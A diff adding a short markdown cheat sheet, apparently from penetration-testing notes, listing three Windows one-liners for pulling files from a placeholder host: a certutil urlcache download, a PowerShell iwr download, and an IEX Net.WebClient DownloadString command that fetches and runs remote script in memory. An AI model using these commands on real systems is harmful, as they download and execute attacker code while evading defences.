@@ -1,0 +1,12 @@
+# Certutil 
+
+certutil -split -urlcache -f http://url/archive 
+
+# IWR
+
+iwr ip -outfile archive
+
+# IEX
+
+IEX (New-Object Net.WebClient).downloadstring('http://ip/archive')
+
